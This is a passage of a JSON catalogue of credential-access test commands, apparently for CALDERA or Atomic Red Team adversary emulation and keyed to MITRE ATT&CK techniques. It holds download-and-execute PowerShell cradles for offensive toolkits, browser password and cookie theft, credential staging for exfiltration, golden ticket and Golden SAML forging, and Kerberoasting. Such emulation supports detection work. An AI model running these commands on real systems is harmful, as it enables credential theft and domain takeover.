      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n",
         "command": "type C:\\Windows\\Panther\\unattend.xml && type C:\\Windows\\Panther\\Unattend\\unattend.xml"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Launches SessionGopher on this system via WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); sessionGopher -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Extracting credentials from files\n",
         "command": "grep -ri password /; exit 0"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
         "command": "for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n",
         "command": "python2 laZagne.py all"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Snaffler -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n",
         "command": "findstr /si pass *.xml *.doc *.txt *.xls; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); sensitivefiles -noninteractive -consoleoutput"
      }
   ],
   "JYNETWORKEVENTCUSTOMTHREE": [
      {
         "technique_id": "JYNETWORKEVENTCUSTOMTHREE",
         "technique_name": "Network event invoking custom activity 3",
         "tactic": "credential-access",
         "description": "Network event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References www.techtarget.com/searchnetworking/tip/PowerShell-commands-for-network-troubleshooting 3",
         "command": "ping remote.cs.binghamton.edu; Test-Connection remote.cs.binghamton.edu; Get-NetTCPConnection -LocalPort 135"
      }
   ],
   "JYREGISTRYEVENTCUSTOM": [
      {
         "technique_id": "JYREGISTRYEVENTCUSTOM",
         "technique_name": "Registry event invoking custom activity",
         "tactic": "credential-access",
         "description": "Registry event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References",
         "command": "New-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY'; Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY' -Name 'JYPROPERTY' -Value 'JY'; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY'; Remove-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\JY_KEY' -Recurse"
      }
   ],
   "T1555.003": [
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
         "command": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"$env:temp\" > $null; Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Copy-Item \"C:\\Users\\puma-4\\Desktop\\Login_Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null; cd \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\BrowserCollector.exe"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
         "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"; Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\""
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n",
         "command": "cd ~/Library/Cookies; grep -q \"coinbase\" \"Cookies.binarycookies\""
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); browserpwn -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
         "command": "C:\\Users\\puma-4\\Desktop\\accesschk.exe -accepteula .; "
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
         "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Default\\Login Data\" -Destination \"$env:TEMP\""
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
         "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); kittenz -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
         "command": "$exfil_folder = \"$env:temp\\T1555.003\"; if (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}; $FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; if (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}; if (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}; if (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}; if (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} ; compress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n",
         "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt; cat $env:temp\\T1555.003Test8.txt"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command \"all\""
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n",
         "command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"; cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\""
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
         "command": "\"PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe\" browsers"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",
         "command": "python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt"
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
         "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\f3d204_WebBrowserPassView.exe\"; Start-Sleep -Second 4; Stop-Process -Name \"f3d204_WebBrowserPassView\""
      },
      {
         "technique_id": "T1555.003",
         "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
         "tactic": "credential-access",
         "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
         "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"$env:temp\" -Force -Recurse"
      }
   ],
   "T1606.002": [
      {
         "technique_id": "T1606.002",
         "technique_name": "Forge Web Credentials: SAML token",
         "tactic": "credential-access",
         "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n",
         "command": "Import-Module AADInternals -Force; $saml = New-AADIntSAMLToken -ImmutableID \"aehgdqBTZV50DKQZmNJ8mg==\" -PfxFileName \".\\ADFS_signing.pfx\" -Issuer \"http://contoso.com/adfs/services/trust/\"; $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache; if ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }; Write-Host \"End of Golden SAML\""
      }
   ],
   "T1555": [
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "This module will extract the credentials from Windows Credential Manager",
         "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force"
      },
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); lazagnemodule -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
         "command": "vaultcmd /listcreds:\"Windows Credentials\" /all"
      },
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\""
      },
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "This module will extract the credentials from Windows Credential Manager",
         "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force"
      },
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); decryptteamviewer -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
         "command": "vaultcmd /listcreds:\"Web Credentials\" /all"
      },
      {
         "technique_id": "T1555",
         "technique_name": "Credentials from Password Stores",
         "tactic": "credential-access",
         "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); wificreds -consoleoutput -noninteractive"
      }
   ],
   "JYNETWORKEVENTCUSTOMTWO": [
      {
         "technique_id": "JYNETWORKEVENTCUSTOMTWO",
         "technique_name": "Network event invoking custom activity 2",
         "tactic": "credential-access",
         "description": "Network event invoking custom activity to investigate reason for only getting process events for caldera-technique process. References www.techtarget.com/searchnetworking/tip/PowerShell-commands-for-network-troubleshooting 2",
         "command": "ping panther.cs.binghamton.edu; Test-Connection panther.cs.binghamton.edu; Get-NetTCPConnection -LocalPort 135"
      }
   ],
   "T1552.006": [
      {
         "technique_id": "T1552.006",
         "technique_name": "Unsecured Credentials: Group Policy Preferences",
         "tactic": "credential-access",
         "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n",
         "command": ". \"C:\\Users\\puma-4\\Desktop\\Get-GPPPassword.ps1\"; Get-GPPPassword -Verbose"
      },
      {
         "technique_id": "T1552.006",
         "technique_name": "Unsecured Credentials: Group Policy Preferences",
         "tactic": "credential-access",
         "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n",
         "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml"
      }
   ],
   "T1558.001": [
      {
         "technique_id": "T1558.001",
         "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
         "tactic": "credential-access",
         "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
         "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; cmd.exe /c \"$Env:temp\\rubeus.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden; $filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   cd %temp%;   \"$Env:temp\\rubeus.exe\" ptt /ticket:kirbifile;   echo.;   echo Requesting SYSVOL:;   dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
      },
      {
         "technique_id": "T1558.001",
         "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
         "tactic": "credential-access",
         "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
         "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\" \"exit\";   echo.;   echo Requesting SYSVOL:;   dir \\\\%userdnsdomain%\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
      }
   ],
   "T1539": [
      {
         "technique_id": "T1539",
         "technique_name": "Steal Web Session Cookie",
         "tactic": "credential-access",
         "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
         "command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue; $CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"; \"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$CookieDBLocation\" | out-file -filepath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt\""
      },
      {
         "technique_id": "T1539",
         "technique_name": "Steal Web Session Cookie",
         "tactic": "credential-access",
         "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
         "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue; \"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c C:\\Users\\puma-4\\Desktop\\sqlite3.exe \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" | out-file -filepath \"C:\\Users\\puma-4\\Desktop\\T1539ChromeCookies.txt\""
      },
      {
         "technique_id": "T1539",
         "technique_name": "Steal Web Session Cookie",
         "tactic": "credential-access",
         "description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",
         "command": "killall 'Google Chrome'; sleep 1; open -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/; sleep 1; /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337"
      }
   ],
   "T1558.003": [
      {
         "technique_id": "T1558.003",
         "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
         "tactic": "credential-access",
         "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n",
         "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing); Invoke-Kerberoast | fl"
      },
      {
         "technique_id": "T1558.003",
         "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
         "tactic": "credential-access",
         "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n",
         "command": "Add-Type -AssemblyName System.IdentityModel  ; setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"
      },
      {
         "technique_id": "T1558.003",
         "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
         "tactic": "credential-access",
         "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n",
         "command": "setspn -T %USERDNSDOMAIN% -Q */*"
      },
      {
         "technique_id": "T1558.003",
         "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
         "tactic": "credential-access",
         "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
         "command": "klist purge; cmd.exe /c \"C:\\Users\\puma-4\\Desktop\\Rubeus.exe\" kerberoast None /outfile:\"C:\\Users\\puma-4\\Desktop\\rubeus_output.txt\""
      },
      {
         "technique_id": "T1558.003",
         "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
         "tactic": "credential-access",
         "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\""
      },
      {
         "technique_id": "T1558.003",
         "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
